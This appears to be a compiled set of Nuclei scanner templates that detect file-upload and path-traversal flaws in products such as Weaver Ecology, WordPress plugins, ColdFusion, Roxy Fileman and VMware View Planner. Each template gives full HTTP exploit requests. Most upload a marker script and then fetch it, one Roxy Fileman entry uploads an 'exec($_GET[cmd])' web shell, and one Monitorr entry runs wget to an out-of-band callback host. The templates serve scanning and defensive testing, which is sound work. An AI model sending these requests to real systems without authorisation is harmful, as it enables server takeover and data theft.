# Zhiyuan OA Arbitrary File Upload Vulnerability

## Description

- A vulnerability in Zhiyuan OA allows remote unauthenticated attackers to upload arbitrary files to the remote server and cause execute arbitrary code to be executed.
- severity - critical
- tags - zhiyuan,rce,fileupload,seeyon,intrusive

## Requests

- Method - GET

### URL

- {{BaseURL}}/seeyon/thirdpartyController.do.css/..;/ajax.do

### Matchers

**Type - word**

- words
  1. java.lang.NullPointerException:null

**Type - word**

- words
  1. text/html
- part - header

**Type - status**

- status
  1. 200

---

# OA 9 - Arbitrary File Upload

## Description

- OA 9 is susceptible to arbitrary file upload via the uploadOperation.jsp endpoint. These files can be subsequently called and are executed by the remote software, and an attacker can obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
- severity - high
- tags - rce,jsp,fileupload,intrusive

## Requests

### Step - 1

```
POST /page/exportImport/uploadOperation.jsp HTTP/1.1
Host: {{Hostname}}
Origin: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo

------WebKitFormBoundaryFy3iNVBftjP6IOwo
Content-Disposition: form-data; name="file"; filename="poc.jsp"
Content-Type: application/octet-stream

<%out.print(2be8e556fee1a876f10fa086979b8c7c);%>
------WebKitFormBoundaryFy3iNVBftjP6IOwo--

```

### Step - 2

```
GET /page/exportImport/fileTransfer/poc.jsp HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body_2, "2be8e556fee1a876f10fa086979b8c7c")
  2. status_code_2 == 200
- condition - and

---

# Ecology - Arbitrary File Upload

## Description

- Ecology contains an arbitrary file upload vulnerability. An attacker can upload arbitrary files to the server, which in turn can be used to make the application execute file content as code, As a result, an attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - ecology,upload,fileupload,intrusive

## Requests

### Step - 1

```
POST /page/exportImport/uploadOperation.jsp HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo

------WebKitFormBoundaryFy3iNVBftjP6IOwo
Content-Disposition: form-data; name="file"; filename="{{randstr}}.jsp"
Content-Type: application/octet-stream

<%out.print(364536*876356);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryFy3iNVBftjP6IOwo--

```

### Step - 2

```
GET /page/exportImport/fileTransfer/{{randstr}}.jsp HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. status_code_1 == 200
  2. contains(body_2, '319463310816') || status_code_2 == 200
- condition - and

---

# WordPress 3DPrint Lite \<1.9.1.5 - Arbitrary File Upload

## Description

- WordPress 3DPrint Lite plugin before 1.9.1.5 contains an arbitrary file upload vulnerability. The p3dlite_handle_upload AJAX action of the plugin does not have any authorization and does not check the uploaded file. An attacker can upload arbitrary files to the server, which in turn can be used to make the application execute file content as code, As a result, an attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

- severity - high
- tags - wpscan,edb,wordpress,wp,wp-plugin,fileupload,intrusive,3dprint

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------54331109111293931601238262353

-----------------------------54331109111293931601238262353
Content-Disposition: form-data; name="action"

p3dlite_handle_upload
-----------------------------54331109111293931601238262353
Content-Disposition: form-data; name="file"; filename={{randstr}}.php
Content-Type: text/php

<?php echo '3DPrint-arbitrary-file-upload'; ?>
-----------------------------54331109111293931601238262353--

```

### Step - 2

```
GET /wp-content/uploads/p3d/{{randstr}}.php HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(all_headers_2, "text/html")
  2. status_code_2 == 200
  3. contains(body_2, '3DPrint-arbitrary-file-upload')
- condition - and

---

# WordPress SimpleFilelist - Remote Code Execution

## Description

- Simple File List WordPress plugin was found to be vulnerable to an unauthenticated arbitrary file upload leading to remote code execution. The Python exploit first uploads a file containing PHP code but with a png image file extension. A second request is sent to move (rename) the png file to a PHP file.

- severity - critical
- tags - wpscan,wordpress,wp-plugin,rce,intrusive,fileupload,python

## Requests

### Step - 1

```
POST /wp-content/plugins/simple-file-list/ee-upload-engine.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: multipart/form-data; boundary=6985fa39c0698d07f6d418b37388e1b2

--6985fa39c0698d07f6d418b37388e1b2
Content-Disposition: form-data; name="eeSFL_ID"

1
--6985fa39c0698d07f6d418b37388e1b2
Content-Disposition: form-data; name="eeSFL_FileUploadDir"

/wp-content/uploads/simple-file-list/
--6985fa39c0698d07f6d418b37388e1b2
Content-Disposition: form-data; name="eeSFL_Timestamp"

1587258885
--6985fa39c0698d07f6d418b37388e1b2
Content-Disposition: form-data; name="eeSFL_Token"

ba288252629a5399759b6fde1e205bc2
--6985fa39c0698d07f6d418b37388e1b2
Content-Disposition: form-data; name="file"; filename="nuclei.png"
Content-Type: image/png

<?php echo "Nuclei - Open source project (github.com/projectdiscovery/nuclei)"; phpinfo(); ?>
--6985fa39c0698d07f6d418b37388e1b2--

```

### Step - 2

```
POST /wp-content/plugins/simple-file-list/ee-file-engine.php HTTP/1.1
Host: {{Hostname}}
X-Requested-With: XMLHttpRequest
Accept: */*
Content-Type: application/x-www-form-urlencoded

eeSFL_ID=1&eeFileOld=nuclei.png&eeListFolder=%2F&eeFileAction=Rename%7Cnuclei.php

```

### Step - 3

```
GET /wp-content/uploads/simple-file-list/nuclei.php HTTP/1.1
Host: {{Hostname}}
Accept: */*

```

### Matchers

**Type - word**

- words
  1. Nuclei - Open source project (github.com/projectdiscovery/nuclei)
  2. PHP Version
  3. Configuration Command
- part - body
- condition - and

**Type - word**

- words
  1. text/html
- part - header

**Type - status**

- status
  1. 200

---

# WordPress AIT CSV Import Export - Unauthenticated Remote Code Execution

## Description

- The AIT CSV Import/Export plugin \<= 3.0.3 allows unauthenticated remote attackers to upload and execute arbitrary PHP code. The upload-handler does not require authentication, nor validates the uploaded content.

- severity - critical
- tags - wp-plugin,rce,fileupload,unauth,wpscan,msf,wordpress,ait-csv,wp,intrusive

## Requests

### Step - 1

```
POST /wp-content/plugins/ait-csv-import-export/admin/upload-handler.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: multipart/form-data; boundary=------------------------ab360007dbae2de8

--------------------------ab360007dbae2de8
Content-Disposition: form-data; name="file"; filename="{{randstr}}.php"
Content-Type: application/octet-stream

sep=;<?php echo md5('ait-csv-import-export-rce');?>

--------------------------ab360007dbae2de8--

```

### Step - 2

```
GET /wp-content/uploads/{{randstr}}.php HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. fe394b60dc324c3bac3060d600ad4349

**Type - status**

- status
  1. 200

---

# Emerson Dixell XWEB-500 - Arbitrary File Write

## Description

- Emerson Dixell XWEB-500 products are affected by arbitrary file write vulnerabilities in /cgi-bin/logo_extra_upload.cgi, /cgi-bin/cal_save.cgi, and /cgi-bin/lo_utils.cgi. An attacker will be able to write any file on the target system without any kind of authentication mechanism, and this can lead to denial of service and potentially remote code execution. Note that this product has not been supported since 2018 and should be removed or replaced.
- severity - critical
- tags - lfw,iot,dixell,xweb500,edb,fileupload,intrusive

## Requests

### Step - 1

```
POST /cgi-bin/logo_extra_upload.cgi HTTP/1.1
Host: {{Hostname}}
Content-Type: application/octet-stream

{{randstr}}.txt
dixell-xweb500-filewrite

```

### Step - 2

```
GET /logo/{{randstr}}.txt HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body_2, "dixell-xweb500-filewrite")

**Type - status**

- status
  1. 200

---

# Showdoc \<2.8.6 - Remote Code Execution

## Description

- Showdoc versions before 2.8.6 is susceptible to remote code execution.

- severity - critical
- tags - rce,fileupload,showdoc,oss,intrusive

## Requests

### Step - 1

```
POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=--------------------------835846770881083140190633

----------------------------835846770881083140190633
Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
Content-Type: text/plain

<?php echo md5('rce_test');?>
----------------------------835846770881083140190633--

```

### Matchers

**Type - word**

- part - body
- words
  1. "url":"http:
  2. "success":1
- condition - and

**Type - status**

- status
  1. 200

### Extractors

**Type - json**

- json
  1. .url

---

# UniSharp Laravel File Manager 2.0.0 - Arbitrary File Read

## Description

- UniSharp Larevel File Manager 2.0.0 is vulnerable to arbitrary file read.
- severity - high
- tags - lfr,edb,lfi,unisharp,laravel,filemanager,fileupload

## Requests

- Method - GET

### URL

- {{BaseURL}}/laravel-filemanager/download?working_dir=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2F&type=&file=passwd

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# PowerCreator CMS - Remote Code Execution

## Description

- PowerCreator CMS is susceptible to a remote code execution vulnerability.

- severity - critical
- tags - rce,powercreator,intrusive,fileupload

## Requests

### Step - 1

```
POST /upload/UploadResourcePic.ashx?ResourceID=8382 HTTP/1.1
Host: {{Hostname}}
Content-Disposition: form-data;name="file1";filename="poc.aspx";
Content-Type: multipart/form-data; boundary=---------------------------20873900192357278038549710136

-----------------------------20873900192357278038549710136
Content-Disposition: form-data; name="file1"; filename="poc.aspx"
Content-Type: image/jpeg

{{randstr}}
-----------------------------20873900192357278038549710136--

```

### Step - 2

```
GET /ResourcePic/{{endpoint}} HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body_2, '{{randstr}}') && status_code_2 == 200

### Extractors

**Type - regex**

- name - endpoint
- internal - True
- part - body
- regex
  1. (.\*?.ASPX)

---

# Core Chuangtian Cloud Desktop System - Remote Code Execution

## Description

- Core Chuangtian Cloud Desktop System is susceptible to remote code execution vulnerabilities.
- severity - critical
- tags - rce,fileupload,intrusive,cloud,chuangtian

## Requests

### Step - 1

```
POST /Upload/upload_file.php?l=test HTTP/1.1
Host: {{Hostname}}
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv

------WebKitFormBoundaryfcKRltGv
Content-Disposition: form-data; name="file"; filename="{{randstr}}.php"
Content-Type: image/avif

<?php echo md5("core-chuangtian-cloud"); ?>
------WebKitFormBoundaryfcKRltGv--

```

### Step - 2

```
GET /Upload/test/{{randstr}}.php HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body_2, "f0a712e2bcf99c5b0c370b3a4286bb35")
  2. status_code_2 == 200
- condition - and

---

# UEditor - Arbitrary File Upload

## Description

- UEditor contains an arbitrary file upload vulnerability. An attacker can upload arbitrary files to the server, which in turn can be used to make the application execute file content as code, As a result, an attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - high
- tags - ueditor,fileupload

## Requests

- Method - GET

### URL

- {{BaseURL}}/ueditor/net/controller.ashx?action=catchimage&encode=utf-8

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. 没有指定抓取源
- part - body

---

# Laravel File Manager - Panel Detect

## Description

- Laravel File Manager panel was detected.
- severity - info
- tags - laravel,filemanager,fileupload

## Requests

- Method - GET

### URL

- {{BaseURL}}/laravel-filemanager?type=Files

### Matchers

**Type - word**

- part - body
- words
  1. Laravel FileManager

**Type - status**

- status
  1. 200

---

# Roxy File Manager - Panel Detect

## Description

- Roxy File Manager panel was detected.
- severity - info
- tags - tech,fileupload,roxy,fileman

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.html
- {{BaseURL}}/fileman/index.html
- {{BaseURL}}/fileman/php/fileslist.php
- {{BaseURL}}/fileman/asp_net/main.ashx

### Matchers

**Type - word**

- part - body
- words
  1. Roxy file manager
  2. [{"p":"
- condition - or

**Type - status**

- status
  1. 200

---

# Pan Micro E-office File Uploads

## Description

- The Pan Wei Micro E-office version running allows arbitrary file uploads from a remote attacker.
- severity - critical
- tags - pan,micro,cnvd,cnvd2021,fileupload,intrusive

## Requests

### Step - 1

```
POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4

--e64bdf16c554bbc109cecef6451c26a4
Content-Disposition: form-data; name="Filedata"; filename="{{randstr}}.php"
Content-Type: image/jpeg

<?php echo md5('CNVD-2021-49104');?>

--e64bdf16c554bbc109cecef6451c26a4--

```

### Step - 2

```
GET /images/logo/logo-eoffice.php HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. 94d01a2324ce38a2e29a629c54190f67

**Type - status**

- status
  1. 200

---

# WordPress Contact Form 7 - Unrestricted File Upload

## Description

- WordPress Contact Form 7 before 5.3.2 allows unrestricted file upload and remote code execution because a filename may contain special characters.
- severity - critical
- tags - cve,cve2020,wordpress,wp-plugin,rce,fileupload,intrusive

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/contact-form-7/readme.txt

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- part - body
- words
  1. Contact Form 7
  2. == Changelog ==
- condition - and

**Type - dsl**

- dsl
  1. compare_versions(version, '\< 5.3.2')

### Extractors

**Type - regex**

- name - version
- internal - True
- group - 1
- regex
  1. (?m)Stable tag: ([0-9.]+)

**Type - regex**

- group - 1
- regex
  1. (?m)Stable tag: ([0-9.]+)

---

# Joomla! Component GMapFP 3.5 - Arbitrary File Upload

## Description

- Joomla! Component GMapFP 3.5 is vulnerable to arbitrary file upload vulnerabilities. An attacker can access the upload function of the application
  without authentication and can upload files because of unrestricted file upload which can be bypassed by changing Content-Type & name file too double ext.

- severity - high
- tags - cve,cve2020,joomla,edb,packetstorm,fileupload,intrusive

## Requests

### Step - 1

```
POST /index.php?option={{component}}&controller=editlieux&tmpl=component&task=upload_image HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySHHbUsfCoxlX1bpS
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: {{BaseURL}}
Connection: close

------WebKitFormBoundarySHHbUsfCoxlX1bpS
Content-Disposition: form-data; name="option"

com_gmapfp
------WebKitFormBoundarySHHbUsfCoxlX1bpS
Content-Disposition: form-data; name="image1"; filename="nuclei.html.gif"
Content-Type: text/html

projectdiscovery

------WebKitFormBoundarySHHbUsfCoxlX1bpS
Content-Disposition: form-data; name="no_html"

no_html
------WebKitFormBoundarySHHbUsfCoxlX1bpS--

```

### Extractors

**Type - regex**

- part - body
- regex
  1. window\.opener\.(changeDisplayImage|addphoto)\("(.\*?)"\);

**Payloads**- component

---

# Apache Flink 1.5.1 - Local File Inclusion

## Description

- Apache Flink 1.5.1 is vulnerable to local file inclusion because of a REST handler that allows file uploads to an arbitrary location on the local file system through a maliciously modified HTTP HEADER.

- severity - high
- tags - lfi,flink,fileupload,vulhub,cve,cve2020,apache,intrusive

## Requests

### Step - 1

```
POST /jars/upload HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y

------WebKitFormBoundaryoZ8meKnrrso89R6Y
Content-Disposition: form-data; name="jarfile"; filename="../../../../../../../tmp/poc"

test-poc
------WebKitFormBoundaryoZ8meKnrrso89R6Y--

```

---

# IncomCMS 2.0 - Arbitrary File Upload

## Description

- IncomCMS 2.0 has a an insecure file upload vulnerability in modules/uploader/showcase/script.php. This allows unauthenticated attackers to upload files into the server.

- severity - critical
- tags - cve,cve2020,incomcms,fileupload,intrusive

## Requests

### Step - 1

```
POST /incom/modules/uploader/showcase/script.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBEJZt0IK73M2mAbt

------WebKitFormBoundaryBEJZt0IK73M2mAbt
Content-Disposition: form-data; name="Filedata"; filename="{{randstr_1}}.png"
Content-Type: text/html

{{randstr_2}}
------WebKitFormBoundaryBEJZt0IK73M2mAbt--

```

### Step - 2

```
GET /upload/userfiles/image/{{randstr_1}}.png HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body_1
- words
  1. {"status":"1","name":"{{randstr_1}}.png"}

**Type - word**

- part - body_2
- words
  1. {{randstr_2}}

---

# Monitorr 1.7.6m - Unauthenticated Remote Code Execution

## Description

- Monitorr 1.7.6m is susceptible to a remote code execution vulnerability. Improper input validation and lack of authorization leads to arbitrary file uploads in the web application. An unauthorized attacker with web access to could upload and execute a specially crafted file, leading to remote code execution within the Monitorr.
- severity - critical
- tags - cve2020,monitorr,rce,oast,unauth,edb,cve,fileupload,intrusive

## Requests

### Step - 1

```
POST /assets/php/upload.php HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate
Accept: text/plain, */*; q=0.01
Connection: close
Accept-Language: en-US,en;q=0.5
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------31046105003900160576454225745
Origin: http://{{Hostname}}
Referer: http://{{Hostname}}

-----------------------------31046105003900160576454225745
Content-Disposition: form-data; name="fileToUpload"; filename="{{randstr}}.php"
Content-Type: image/gif

GIF89a213213123<?php shell_exec("wget -c http://{{interactsh-url}}");

-----------------------------31046105003900160576454225745--

```

### Step - 2

```
GET /assets/data/usrimg/{{tolower("{{randstr}}.php")}} HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

---

# WordPress wpDiscuz \<=7.0.4 - Remote Code Execution

## Description

- WordPress wpDiscuz plugin versions version 7.0 through 7.0.4 are susceptible to remote code execution. This flaw gave unauthenticated attackers the ability to upload arbitrary files, including PHP files, and achieve remote code execution on a vulnerable site's server.
- severity - critical
- tags - rce,fileupload,packetstorm,cve,cve2020,wordpress,wp-plugin,intrusive

## Requests

### Step - 1

```
GET /?p=1 HTTP/1.1
Host: {{Hostname}}
Accept: */*

```

### Step - 2

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary88AhjLimsDMHU1Ak
Origin: {{BaseURL}}
Referer: {{BaseURL}}

------WebKitFormBoundary88AhjLimsDMHU1Ak
Content-Disposition: form-data; name="action"

wmuUploadFiles
------WebKitFormBoundary88AhjLimsDMHU1Ak
Content-Disposition: form-data; name="wmu_nonce"

{{wmuSecurity}}
------WebKitFormBoundary88AhjLimsDMHU1Ak
Content-Disposition: form-data; name="wmuAttachmentsData"

undefined
------WebKitFormBoundary88AhjLimsDMHU1Ak
Content-Disposition: form-data; name="wmu_files[0]"; filename="rce.php"
Content-Type: image/png

{{base64_decode('/9j/4WpFeGlmTU0q/f39af39Pv39/f39/f39/f2o/f39/cD9/f39/f39/f39/f/g/UpGSUb9/f39/9tD/f0M/QwK/f0=')}}
<?php phpinfo();?>
------WebKitFormBoundary88AhjLimsDMHU1Ak
Content-Disposition: form-data; name="postId"

1
------WebKitFormBoundary88AhjLimsDMHU1Ak--

```

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. success":true
  2. fullname
  3. shortname
  4. url
- condition - and
- part - body

### Extractors

**Type - regex**

- part - body
- internal - True
- name - wmuSecurity
- group - 1
- regex
  1. wmuSecurity":"([a-z0-9]+)

**Type - regex**

- part - body
- group - 1
- regex
  1. "url":"([a-z:\\/0-9-.]+)"

---

# WordPress File Manager Plugin - Remote Code Execution

## Description

- The WordPress File Manager plugin prior to version 6.9 is susceptible to remote code execution. The vulnerability allows unauthenticated remote attackers to upload .php files.
- severity - critical
- tags - cve,cve2020,wordpress,rce,kev,fileupload,intrusive

## Requests

### Step - 1

```
POST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: multipart/form-data; boundary=------------------------ca81ac1fececda48

--------------------------ca81ac1fececda48
Content-Disposition: form-data; name="reqid"

17457a1fe6959
--------------------------ca81ac1fececda48
Content-Disposition: form-data; name="cmd"

upload
--------------------------ca81ac1fececda48
Content-Disposition: form-data; name="target"

l1_Lw
--------------------------ca81ac1fececda48
Content-Disposition: form-data; name="mtime[]"

1576045135
--------------------------ca81ac1fececda48
Content-Disposition: form-data; name="upload[]"; filename="poc.txt"
Content-Type: text/plain

poc-test
--------------------------ca81ac1fececda48--

```

### Matchers

**Type - word**

- words
  1. poc.txt
  2. added
- condition - and

**Type - word**

- words
  1. application/json
- part - header

**Type - status**

- status
  1. 200

---

# WordPress Contact Form 7 \<1.3.3.3 - Remote Code Execution

## Description

- WordPress Contact Form 7 before 1.3.3.3 allows unrestricted file upload and remote code execution by setting supported_type to php% and uploading a .php% file.

- severity - critical
- tags - wordpress,wp-plugin,fileupload,wp,rce,packetstorm,cve,cve2020,intrusive

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=---------------------------350278735926454076983690555601
X-Requested-With: XMLHttpRequest

-----------------------------350278735926454076983690555601
Content-Disposition: form-data; name="supported_type"

txt%
-----------------------------350278735926454076983690555601
Content-Disposition: form-data; name="size_limit"

5242880
-----------------------------350278735926454076983690555601
Content-Disposition: form-data; name="action"

dnd_codedropz_upload
-----------------------------350278735926454076983690555601
Content-Disposition: form-data; name="type"

click
-----------------------------350278735926454076983690555601
Content-Disposition: form-data; name="upload-file"; filename="{{randstr}}.txt%"
Content-Type: application/x-httpd-php

CVE-2020-12800-{{randstr}}
-----------------------------350278735926454076983690555601--

```

### Step - 2

```
GET /wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/{{randstr}}.txt HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body_2
- words
  1. CVE-2020-12800-{{randstr}}

**Type - status**

- status
  1. 200

---

# Apache ActiveMQ Fileserver - Arbitrary File Write

## Description

- Apache ActiveMQ 5.x before 5.14.0 allows remote attackers to upload and execute arbitrary files via an HTTP PUT followed by an HTTP MOVE request via the Fileserver web application.
- severity - critical
- tags - fileupload,kev,edb,cve,cve2016,apache,activemq,intrusive

## Requests

### Step - 1

```
PUT /fileserver/test.txt HTTP/1.1
Host: {{Hostname}}

{{randstr}}

```

### Step - 2

```
GET /fileserver/test.txt HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. status_code_1==204
  2. status_code_2==200
  3. contains((body_2), '{{randstr}}')
- condition - and

---

# Adobe ColdFusion - Unrestricted File Upload Remote Code Execution

## Description

- Adobe ColdFusion versions July 12 release (2018.0.0.310739), Update 6 and earlier, and Update 14 and earlier have an unrestricted file upload vulnerability. Successful exploitation could lead to arbitrary code execution.
- severity - critical
- tags - cve,cve2018,adobe,rce,coldfusion,fileupload,kev,intrusive

## Requests

### Step - 1

```
POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=---------------------------24464570528145

-----------------------------24464570528145
Content-Disposition: form-data; name="file"; filename="{{randstr}}.jsp"
Content-Type: image/jpeg

<%@ page import="java.util.*,java.io.*"%>
<%@ page import="java.security.MessageDigest"%>
<%
String cve = "CVE-2018-15961";
MessageDigest alg = MessageDigest.getInstance("MD5");
alg.reset();
alg.update(cve.getBytes());
byte[] digest = alg.digest();
StringBuffer hashedpasswd = new StringBuffer();
String hx;
for (int i=0;i<digest.length;i++){
  hx =  Integer.toHexString(0xFF & digest[i]);
  if(hx.length() == 1){hx = "0" + hx;}
  hashedpasswd.append(hx);
}
out.println(hashedpasswd.toString());
%>
-----------------------------24464570528145
Content-Disposition: form-data; name="path"

{{randstr}}.jsp
-----------------------------24464570528145--

```

### Step - 2

```
GET /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/{{randstr}}.jsp HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- words
  1. ddbb3e76f92e78c445c8ecb392beb225

**Type - status**

- status
  1. 200

---

# Roxy Fileman 1.4.5 - Unrestricted File Upload

## Description

- Roxy Fileman 1.4.5 is susceptible to unrestricted file upload via upload.php. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

- severity - critical
- tags - cve,cve2018,roxy,fileman,rce,fileupload,intrusive,packetstorm,edb

## Requests

### Step - 1

```
POST /php/upload.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary20kgW2hEKYaeF5iP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36
Origin: {{BaseURL}}
Referer: {{BaseURL}}
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

------WebKitFormBoundary20kgW2hEKYaeF5iP
Content-Disposition: form-data; name="action"

upload
------WebKitFormBoundary20kgW2hEKYaeF5iP
Content-Disposition: form-data; name="method"

ajax
------WebKitFormBoundary20kgW2hEKYaeF5iP
Content-Disposition: form-data; name="d"

/Uploads
------WebKitFormBoundary20kgW2hEKYaeF5iP
Content-Disposition: form-data; name="files[]"; filename="{{randstr}}.php7"
Content-Type: application/octet-stream

<?php
echo exec($_GET["cmd"]);
?>

------WebKitFormBoundary20kgW2hEKYaeF5iP--

```

### Step - 2

```
GET /Uploads/{{randstr}}.php7?cmd=echo+"roxyfileman"+|+rev HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. namelifyxor

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Apache httpd \<=2.4.29 - Arbitrary File Upload

## Description

- Apache httpd 2.4.0 to 2.4.29 is susceptible to arbitrary file upload vulnerabilities via the expression specified in \<FilesMatch>, which could match '$' to a newline character in a malicious filename rather than matching only the end of the filename. This could be exploited in environments where uploads of some files are externally blocked, but only by matching the trailing portion of the filename.
- severity - high
- tags - apache,httpd,fileupload,vulhub,cve,cve2017,intrusive

## Requests

### Step - 1

```
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKc8fBVDo558U4hbJ

------WebKitFormBoundaryKc8fBVDo558U4hbJ
Content-Disposition: form-data; name="file"; filename="{{randstr}}.php"

{{randstr_1}}

------WebKitFormBoundaryKc8fBVDo558U4hbJ
Content-Disposition: form-data; name="name"

{{randstr}}.php\x0A
------WebKitFormBoundaryKc8fBVDo558U4hbJ--

```

### Step - 2

```
GET /{{randstr}}.php\x0A HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip,deflate
Accept: */*

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body_2, "{{randstr_1}}")

---

# PhpColl 2.5.1 Arbitrary File Upload

## Description

- PhpCollab 2.5.1 and earlier allows remote authenticated users to execute arbitrary code by uploading a file with an executable extension, then accessing it via a direct request to the file in logos_clients/ via clients/editclient.php.
- severity - high
- tags - cve2017,phpcollab,rce,fileupload,edb,cve,intrusive

## Requests

### Step - 1

```
POST /clients/editclient.php?id={{randstr}}&action=update HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=---------------------------154934846911423734231554128137

-----------------------------154934846911423734231554128137
Content-Disposition: form-data; name="upload"; filename="{{randstr}}.php"
Content-Type: application/x-php

<?php echo md5('phpcollab_rce');?>

-----------------------------154934846911423734231554128137--

```

### Step - 2

```
GET /logos_clients/1.php HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. 48dbd2384cb6b996fa1e2855c7f0567f

**Type - status**

- status
  1. 200

---

# Apache Tomcat Servers - Remote Code Execution

## Description

- Apache Tomcat servers 7.0.{0 to 79} are susceptible to remote code execution. By design, you are not allowed to upload JSP files via the PUT method. This is likely a security measure to prevent an attacker from uploading a JSP shell and gaining remote code execution on the server. However, due to the insufficient checks, an attacker could gain remote code execution on Apache Tomcat servers that have enabled PUT method by using a specially crafted HTTP request.

- severity - high
- tags - rce,tomcat,kev,cisa,vulhub,cve,cve2017,apache,fileupload

## Requests

- Method - PUT

---

# VMware View Planner \<4.6 SP1- Remote Code Execution

## Description

- VMware View Planner 4.x prior to 4.6 Security Patch 1 contains a remote code execution vulnerability due to improper input validation and lack of authorization leading to arbitrary file upload in logupload web application.
  An unauthorized attacker with network access to View Planner Harness could upload and execute a specially crafted
  file leading to remote code execution within the logupload container.

- severity - critical
- tags - cve,cve2021,vmware,rce,packetstorm,fileupload,intrusive

## Requests

### Step - 1

```
POST /logupload?logMetaData=%7B%22itrLogPath%22%3A%20%22..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhttpd%2Fhtml%2Fwsgi_log_upload%22%2C%20%22logFileType%22%3A%20%22log_upload_wsgi.py%22%2C%20%22workloadID%22%3A%20%222%22%7D HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySHHbUsfCoxlX1bpS
Accept: text/html
Referer: {{BaseURL}}
Connection: close

------WebKitFormBoundarySHHbUsfCoxlX1bpS
Content-Disposition: form-data; name="logfile"; filename=""
Content-Type: text/plain

POC_TEST

------WebKitFormBoundarySHHbUsfCoxlX1bpS

```

### Matchers

**Type - status**

- status
  1. 200

